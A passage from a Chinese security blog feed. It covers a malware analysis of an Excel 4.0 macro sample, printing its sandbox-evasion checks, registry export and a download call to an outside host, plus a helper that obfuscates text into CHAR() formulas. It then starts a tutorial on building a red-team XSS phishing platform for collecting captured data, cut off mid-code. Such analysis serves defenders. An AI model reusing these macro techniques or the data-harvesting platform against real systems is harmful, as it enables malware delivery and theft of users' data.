"/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/OfficeExcelMacro/10.png" alt="img"></p><h5 id="如何定位该样本的隐藏宏位置"><a href="#如何定位该样本的隐藏宏位置" class="headerlink" title="如何定位该样本的隐藏宏位置"></a>如何定位该样本的隐藏宏位置</h5><p>下载项目</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/DidierStevens/DidierStevensSuite</span><br></pre></td></tr></table></figure><p>然后执行以下命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python oledump.py -p plugin_biff.py --pluginoptions &quot;-o BOUNDSHEET -a&quot; /Users/ascotbe/Downloads/Info_695.xls</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/OfficeExcelMacro/12.png" alt="image-20210308143858216"></p><p>可以看到定位到了宏的位置<strong>D0 66 02 00 02 01 0A 00</strong>，只需要修改第5个字节位置的02即可打开深度隐藏宏</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/OfficeExcelMacro/13.png" alt="image-20210308144106093"></p><h5 id="样本分析"><a href="#样本分析" class="headerlink" title="样本分析"></a>样本分析</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">=IF(GET.WORKSPACE(19),,CLOSE(TRUE))#检查是否存在鼠标，如果GET.WORKSPACE获取的值为false的话，就执行CLOSE保存关闭表格。if函数第二个参数是判断第一个参数返回值为ture执行位置，第三个参数是判断第一个参数返回值为false执行位置</span><br><span class="line">=IF(GET.WORKSPACE(42),,CLOSE(TRUE))#计算机是否能够播放声音</span><br><span class="line">=IF(ISNUMBER(SEARCH(&quot;Windows&quot;,GET.WORKSPACE(1))), ,CLOSE(TRUE))#检查运行Microsoft Excel的环境，然后检查环境的版本号</span><br></pre></td></tr></table></figure><p>如果这三个是正确的，则将Excel安全注册表项复制到<strong>C:\Users\public\1.reg</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">=CALL(&quot;Shell32&quot;,&quot;ShellExecuteA&quot;,&quot;JJCCCJJ&quot;,0,&quot;open&quot;,&quot;C:\Windows\system32\reg.exe&quot;,&quot;EXPORT HKCU\Software\Microsoft\Office\&quot;&amp;GET.WORKSPACE(2)&amp;&quot;\Excel\Security c:\users\public\1.reg /y&quot;,0,5)</span><br></pre></td></tr></table></figure><p>接下来，它等待三秒钟。然后它打开1.reg，从字节位置215开始，并读取接下来的255个字节</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">=WAIT(NOW()+&quot;00:00:03&quot;)</span><br><span class="line">=FOPEN(&quot;c:\users\public\1.reg&quot;)</span><br><span class="line">=FPOS(Q10, 215)</span><br><span class="line">=FREAD(Q10, 255)</span><br></pre></td></tr></table></figure><p>提取出来的<a href="https://app.any.run/tasks/aaf8a9aa-5068-42dd-89cf-cd610ce5e730/">1.reg</a>内容</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/OfficeExcelMacro/11.png" alt="image-20210308180750093"></p><p>1.reg被关闭并删除。然后它在读取的内容（存储在单元格Q12中）中搜索字符串“ 0001”。这是第二次测试，看它是否在沙箱中。如果找到该字符串，它将关闭电子表格。如果找不到字符串“ 0001”，它将尝试下载文件并将其另存为.html文件在**C:\Users\Public\**中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">=FCLOSE(Q10)</span><br><span class="line">=FILE.DELETE(&quot;c:\users\public\1.reg&quot;)</span><br><span class="line">=IF(ISNUMBER(SEARCH(&quot;0001&quot;,Q12)),CLOSE(FALSE),)</span><br><span class="line">=CALL(&quot;urlmon&quot;,&quot;URLDownloadToFileA&quot;,&quot;JJCCJJ&quot;,0,&quot;https://efbzfyvsb.website/f2f23&quot;,&quot;c:\Users\Public\b7gf5yk.html&quot;,0,0)</span><br></pre></td></tr></table></figure><p>完整的英文语法文档<a href="https://raw.staticdn.net/Ascotbe/Image/master/OfficeExcelMacro/Excel4.0MacroFunctionsReference.pdf">下载</a>，中文版<a href="https://raw.staticdn.net/Ascotbe/Image/master/OfficeExcelMacro/MacrofunCn.hlp">下载</a>，一个在线的Excel xml宏函数<a href="http://www.cpearson.com/excel/call.htm">文档</a>里面比官网文档全面</p><p>关于注册表reg文件的解释参考这篇<a href="https://www.cnblogs.com/fczjuever/archive/2013/04/09/3010711.html">博客</a></p><p>最后贴上代码转ASCII代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="string">&quot;&quot;&quot;xxx&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="comment">#print(ord(i))</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=CHAR(&quot;</span>+<span class="built_in">str</span>(<span class="built_in">ord</span>(i))+<span class="string">&quot;)&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="Macro-5-0"><a href="#Macro-5-0" class="headerlink" title="Macro 5.0"></a>Macro 5.0</h3><p>关于VBA宏的制作这里就不概述了，可以参考之前的<a href="https://www.ascotbe.com/2020/07/26/Office_0x01/#Office%E5%AE%8F">文章</a>，可以看到word和excel的vba宏是通用的</p><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://clickallthethings.wordpress.com/2020/04/06/covid-19-excel-4-0-macros-and-sandbox-detection/</span><br><span class="line">https://www.yuque.com/p1ut0/qtmgyx/rqank4</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    
  </entry>
  
  <entry>
    <title>从零开始编写XSS平台</title>
    <link href="https://www.ascotbe.com/2021/01/08/CrossSiteScripting/"/>
    <id>https://www.ascotbe.com/2021/01/08/CrossSiteScripting/</id>
    <published>2021-01-08T10:45:42.000Z</published>
    <updated>2022-01-10T03:06:02.000Z</updated>
    
    <content type="html"><![CDATA[<div class="note danger modern"><p>郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</p></div><blockquote><p>前言</p></blockquote><p>在我们日常渗透或者红队打点的时候都或多或少的会挖掘到XSS漏洞，由于红队钓鱼也经常用到XSS平台，虽然网上免费可以注册的平台很多，但是这些平台都是别人的首先钓鱼到的数据并不是只有你一个人可见，网站的管理员也可以看的到，这就会对某些敏感的红队项目的信息造成泄漏，其次网站也经常不稳定，尝尝十天半个月就要换一个平台重新来一次，所以这篇文章就来了~</p><ul><li>项目地址：<a href="https://github.com/Ascotbe/Medusa">https://github.com/Ascotbe/Medusa</a></li></ul><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CrossSiteScripting/1.gif" alt="938393FBC8A524B353CE58DCC17095F4" style="zoom:50%;" /><h2 id="什么是XSS"><a href="#什么是XSS" class="headerlink" title="什么是XSS"></a>什么是XSS</h2><p><strong>跨站脚本</strong>（英语：Cross-site scripting，通常简称为：XSS）是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。这类攻击通常包含了HTML以及用户端脚本语言。</p><p>Cross-site scripting的英文首字母缩写本应为<strong>CSS</strong>，但因为CSS在网页设计领域已经被广泛指层叠样式表（Cascading Style Sheets），所以将Cross（意为“交叉”）改以交叉形的<strong>X</strong>做为缩写。</p><p><strong>XSS</strong>攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java，VBScript，ActiveX，Flash或者甚至是普通的HTML。攻击成功后，攻击者可能得到更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。</p><h2 id="框架选用"><a href="#框架选用" class="headerlink" title="框架选用"></a>框架选用</h2><h3 id="什么是Django"><a href="#什么是Django" class="headerlink" title="什么是Django"></a>什么是Django</h3><p><strong>Django</strong>是一个开放源代码的Web应用框架，由Python写成。采用了MVT的软件设计模式，即模型（Model），视图（View）和模板（Template）。它在开发初期用于管理劳伦斯出版集团旗下的一些以新闻为主的网站。Django于2005年7月在BSD许可证下发布，它的名字来源于比利时的吉普赛爵士吉他手Django Reinhardt。</p><p>Django的主要目标是简化数据库驱动的网站的开发。Django注重组件的重用性和“可插拔性”，敏捷开发和DRY法则（Don’t Repeat Yourself）。在Django中普遍使用的语言是Python，甚至包括配置文件和数据模型。</p><h3 id="为什么不用Flask"><a href="#为什么不用Flask" class="headerlink" title="为什么不用Flask"></a>为什么不用Flask</h3><blockquote><p>Flask 怎么定位自己的？</p></blockquote><p>将自己定位为微框架。<strong>啥叫微框架，就是毛坯房的意思。给你个毛胚房，你自己装修去。</strong></p><ul><li><p><strong>表单怎么解决？</strong>从社区找了个 Flask-Form</p></li><li><p><strong>跨站攻击？</strong> 社区 Flask-Form 帮你做了。</p></li><li><p><strong>登陆认证鉴权怎么搞定？</strong> 自己写 User 模块。</p></li><li><p><strong>ORM 怎么挑选？</strong>flask-sqlalchemy 自己组装一下。等等 SQLAlchemy 是什么玩意？ query 语法写起来怎么这么原始…</p></li><li><p><strong>DBMigration 怎么做？</strong> Alembic 配合 SQLAlchemy, 等等，SQLAlchemy?? Alembic</p></li><li><p><strong>缓存怎么做？</strong> 自己手动封装一下 RedisPy</p></li></ul><blockquote><p>Django 怎么定位标榜自己的？</p></blockquote><p>划重点 The web framework for perfectionists with deadlines. <strong>完美主义者的 Deadline 终结框架</strong></p><p>定位不同，就会导致设计上和功能上的倾向性。</p><ul><li><p><strong>表单怎么解决？</strong> Django Form 很好用呀。</p></li><li><p><strong>跨站攻击？</strong> Django 帮你做了 csrftoken</p></li><li><p><strong>登陆认证鉴权怎么搞定？</strong> Django 自带了 backend 和 auth 模块。</p></li><li><p><strong>ORM 怎么挑选？</strong>Django ORM 很好用。</p></li><li><p><strong>DBMigration 怎么做？</strong> Django Migration 了解一些？</p></li><li><p><strong>缓存怎么做？</strong> Django Cache 了解一下？</p></li></ul><p>虽然我们整体架构都是自己纯手撸，使用Flask会更适合我们，但是大家有没有听过一句话：<strong>我可以不用，但是我不能没有（逃</strong></p><h3 id="Django简单演示"><a href="#Django简单演示" class="headerlink" title="Django简单演示"></a>Django简单演示</h3><h4 id="首先创建一个项目"><a href="#首先创建一个项目" class="headerlink" title="首先创建一个项目"></a>首先创建一个项目</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 django-admin.py  startproject demo</span><br></pre></td></tr></table></figure><p>项目中只有3个函数</p><ul><li>显示文本</li><li>加法运算</li><li>加法运算后写入数据库</li></ul><h4 id="项目结构"><a href="#项目结构" class="headerlink" title="项目结构"></a>项目结构</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">├── demo</span><br><span class="line">│   ├── asgi.py   </span><br><span class="line">│   ├── __init__.py</span><br><span class="line">│   ├── settings.py</span><br><span class="line">│   ├── urls.py</span><br><span class="line">│   ├── wsgi.py</span><br><span class="line">│   └── XSS</span><br><span class="line">│       ├── __init__.py</span><br><span class="line">│       └── test.py</span><br><span class="line">├── manage.py</span><br><span class="line">├── Database.py</span><br><span class="line">└── xss.db</span><br></pre></td></tr></table></figure><p>在这结构中我们只需要关这三个文件</p><ul><li><p><code>Database.py</code>数据库写入相关文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">GetRootFileLocation</span>:  <span class="comment"># 获取当前文件路径类</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Result</span>(<span class="params">self</span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        system_type = sys.platform</span><br><span class="line">        <span class="keyword">if</span> system_type == <span class="string">&quot;win32&quot;</span> <span class="keyword">or</span> system_type == <span class="string">&quot;cygwin&quot;</span>:</span><br><span class="line">            RootFileLocation = os.path.split(os.path.realpath(__file__))[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">return</span> RootFileLocation</span><br><span class="line">        <span class="keyword">elif</span> system_type == <span class="string">&quot;linux&quot;</span> <span class="keyword">or</span> system_type == <span class="string">&quot;darwin&quot;</span>:</span><br><span class="line">            RootFileLocation = os.path.split(os.path.realpath(__file__))[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">return</span> RootFileLocation</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">GetDatabaseFilePath</span>:  <span class="comment"># 数据库文件路径返回值</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">result</span>(<span class="params">self</span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="keyword">if</span> sys.platform == <span class="string">&quot;win32&quot;</span> <span class="keyword">or</span> sys.platform == <span class="string">&quot;cygwin&quot;</span>:</span><br><span class="line">            DatabaseFilePath = GetRootFileLocation().Result() + <span class="string">&quot;\\xss.db&quot;</span></span><br><span class="line">            <span class="keyword">return</span> DatabaseFilePath</span><br><span class="line">        <span class="keyword">elif</span> sys.platform == <span class="string">&quot;linux&quot;</span> <span class="keyword">or</span> sys.platform == <span class="string">&quot;darwin&quot;</span>:</span><br><span class="line">            DatabaseFilePath = GetRootFileLocation().Result() + <span class="string">&quot;/xss.db&quot;</span></span><br><span class="line">            <span class="keyword">return</span> DatabaseFilePath</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AdditionOperation</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.con = sqlite3.connect(GetDatabaseFilePath().result())</span><br><span class="line">        <span class="comment"># 获取所创建数据的游标</span></span><br><span class="line">        self.cur = self.con.cursor()</span><br><span class="line">        <span class="comment"># 创建表</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            self.cur.execute(<span class="string">&quot;CREATE TABLE AdditionOperation\</span></span><br><span class="line"><span class="string">                                (id INTEGER PRIMARY KEY,\</span></span><br><span class="line"><span class="string">                                a TEXT NOT NULL,\</span></span><br><span class="line"><span class="string">                                b TEXT NOT NULL,\</span></span><br><span class="line"><span class="string">                                calculation result TEXT NOT NULL)&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Write</span>(<span class="params">self, **kwargs</span>) -&gt; <span class="built_in">bool</span> <span class="keyword">or</span> <span class="literal">None</span>:  <span class="comment"># 写入相关信息</span></span><br><span class="line"></span><br><span class="line">        A = kwargs.get(<span class="string">&quot;a&quot;</span>)</span><br><span class="line">        B = kwargs.get(<span class="string">&quot;b&quot;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            self.cur.execute(<span class="string">&quot;INSERT INTO AdditionOperation(a,b,calculation)\</span></span><br><span class="line"><span class="string">                VALUES (?,?,?)&quot;</span>, (A,B,<span class="built_in">int</span>(A)+<span class="built_in">int</span>(B),))</span><br><span class="line">            <span class="comment"># 提交</span></span><br><span class="line">            self.con.commit()</span><br><span class="line">            self.con.close()</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure></li><li><p><code>urls.py</code>路由表，用来表示连接和路由的关系</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> demo.XSS.test <span class="keyword">import</span> SayHello,Add,AddToDatabase</span><br><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> path</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">&#x27;sey_hello/&#x27;</span>, SayHello),</span><br><span class="line">    path(<span class="string">&#x27;add/&#x27;</span>, Add),</span><br><span class="line">    path(<span class="string">&#x27;add_to_database/&#x27;</span>, AddToDatabase),</span><br><span class="line">]</span><br></pre></td></tr></table></figure></li><li><p><code>test.py</code>演示的三个函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> JsonResponse</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> Database <span class="keyword">import</span> AdditionOperation</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">SayHello</span>(<span class="params">request</span>):<span class="comment">#判断请求方式后说你好</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;Hello this is POST~&#x27;</span>, <span class="string">&#x27;code&#x27;</span>: <span class="number">200</span>, &#125;)</span><br><span class="line">    <span class="keyword">elif</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;Hello this is GET&#x27;</span>, <span class="string">&#x27;code&#x27;</span>: <span class="number">200</span>, &#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Add</span>(<span class="params">request</span>):<span class="comment">#进行加法</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        A = json.loads(request.body)[<span class="string">&quot;a&quot;</span>]</span><br><span class="line">        B = json.loads(request.body)[<span class="string">&quot;b&quot;</span>]</span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&#x27;message&#x27;</span>: <span class="built_in">int</span>(A)+<span class="built_in">int</span>(B), <span class="string">&#x27;code&#x27;</span>: <span class="number">200</span>, &#125;)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;请使用POST！&#x27;</span>, <span class="string">&#x27;code&#x27;</span>: <span class="number">500</span>, &#125;)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;a&quot;: &quot;1&quot;,</span></span><br><span class="line"><span class="string">&quot;b&quot;: &quot;2&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">AddToDatabase</span>(<span class="params">request</span>):<span class="comment">#进行加法后写入数据库</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        A = json.loads(request.body)[<span class="string">&quot;a&quot;</span>]</span><br><span class="line">        B = json.loads(request.body)[<span class="string">&quot;b&quot;</span>]</span><br><span class="line">        AdditionOperation().Write(a=A,b=B)</span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&#x27;message&#x27;</span>: <span class="built_in">int</span>(A)+<span class="built_in">int</span>(B), <span class="string">&#x27;code&#x27;</span>: <span class="number">200</span>, &#125;)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;请使用POST！&#x27;</span>, <span class="string">&#x27;code&#x27;</span>: <span class="number">500</span>, &#125;)</span><br></pre></td></tr></table></figure></li></ul><h4 id="演示效果"><a href="#演示效果" class="headerlink" title="演示效果"></a>演示效果</h4><p>在文件更目录启动项目</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 manage.py runserver <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">9999</span> --insecure   </span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CrossSiteScripting/2.gif" alt="1"></p><p>可以看到数据库文件中也写入了相关数据</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CrossSiteScripting/3.png" alt="image-20210108160831363"></p><h2 id="平台设计"><a href="#平台设计" class="headerlink" title="平台设计"></a>平台设计</h2><h3 id="项目关系图"><a href="#项目关系图" class="headerlink" title="项目关系图"></a>项目关系图</h3><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CrossSiteScripting/4.png" alt="图片1"></p><h3 id="项目的逻辑"><a href="#项目的逻辑" class="headerlink" title="项目的逻辑"></a>项目的逻辑</h3><p>除去存放类函数的文件和用户认证文件，整体的文件逻辑如下图</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CrossSiteScripting/5.png" alt="image-20210108135555397"></p><h3 id="API接口"><a href="#API接口" class="headerlink" title="API接口"></a>API接口</h3><p>一个XSS平台在不考虑用户登录的情况下，只需要<strong>11</strong>个API接口以及<strong>3</strong>张表即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">接收数据：/a/xxxxx</span><br><span class="line">加载文件：/s/xxxxx</span><br><span class="line">创建跨站脚本钓鱼项目：/api/create_cross_site_script_project/ </span><br><span class="line">查询跨站脚本钓鱼项目：/api/query_cross_site_script_project/</span><br><span class="line">查询跨站脚本钓鱼项目接收的数据：/api/query_cross_site_script_project_data/</span><br><span class="line">读取用户自定义跨站脚本模板数据：/api/read_cross_site_script_template/</span><br><span class="line">读取默认跨站脚本模板数据：/api/read_default_cross_site_script_template/</span><br><span class="line">保存用户自定义跨站脚本模板数据：/api/save_cross_site_script_template/</span><br><span class="line">修改用户自定义跨站脚本模板数据：/api/modify_cross_site_script_template/</span><br><span class="line">修改跨站脚本钓鱼项目：/api/modify_cross_site_script_project/</span><br><span class="line">查询跨站脚本钓鱼项目的详细信息：/api/query_cross_site_script_project_info</span><br></pre></td></tr></table></figure><p>Django中路由表(urls.py)显示如下：</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CrossSiteScripting/6.png" alt="image-20210108135851293"></p><h3 id="数据库表"><a href="#数据库表" class="headerlink" title="数据库表"></a>数据库表</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">存放接收数据表：CrossSiteScript</span><br><span class="line">存放项目信息表：CrossSiteScriptProject</span><br><span class="line">存放自定义模板表：CrossSiteScriptTemplate</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/CrossSiteScripting/7.png" alt="image-20210108140227379"></p><h3 id="函数讲解"><a href="#函数讲解" class="headerlink" title="函数讲解"></a>函数讲解</h3><p>该模块所有函数逻辑结构都相同，为了不浪费大家的时间，当前就挑选一个生产项目的函数出来讲解，如果想了解各个接口相关参数可以查阅<a href="http://medusa.ascotbe.com/Documentation/#/API/CrossSiteScript">文档</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">GenerateProject</span>(<span class="params">request</span>):<span class="comment">#用来生成项目，并且生成文件和用户绑定</span></span><br><span class="line">    RequestLogRecord(request, request_api=<span class="string">&quot;create_cross_site_script_project&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            JavaScriptFileData = json.loads(request.body)[<span class="string">&quot;javascript_data&quot;</span>]<span class="comment">#获取前端传入的加密过的js文件数据</span></span><br><span class="line">            ProjectName = json.loads(request.body)[<span class="string">&quot;project_name&quot;</span>]<span class="comment">#用户自定义的项目名</span></span><br><span class="line">            UserToken = json.loads(request.body)[<span class="string">&quot;token&quot;</span>]</span><br><span class="line">            Uid = UserInfo().QueryUidWithToken(UserToken)  <span class="comment"># 如果登录成功后就来查询用户名</span></span><br><span class="line">            <span class="keyword">if</span> Uid != <span class="literal">None</span> <span class="keyword">and</span> JavaScriptFileData!=<span class="literal">None</span>:  <span class="comment"># 查到了UID,并且js数据不为空</span></span><br><span class="line">                UserOperationLogRecord(request, request_api=<span class="string">&quot;create_cross_site_script_project&quot;</span>, uid=Uid)</span><br><span class="line">                GetJavaScriptFilePath().Result()<span class="comment">#获取js文件路径</span></span><br><span class="line">                <span class="keyword">while</span> <span class="literal">True</span>:<span class="comment">#如果查询确实冲突了</span></span><br><span class="line">                    JavaScriptSaveFileName=randoms().result(<span class="number">5</span>)<span class="comment">#文件名</span></span><br><span class="line">                    QueryJavaScriptSaveFileNameValidity = CrossSiteScriptProject().RepeatInvestigation(file_name=JavaScriptSaveFileName)<span class="comment">#判断文件是否重复</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="keyword">not</span> QueryJavaScriptSaveFileNameValidity:<span class="comment">#如果不冲突的话跳出循环</span></span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                JavaScriptSaveRoute = GetJavaScriptFilePath().Result() + JavaScriptSaveFileName  <span class="comment"># 获得保存路径</span></span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(JavaScriptSaveRoute, <span 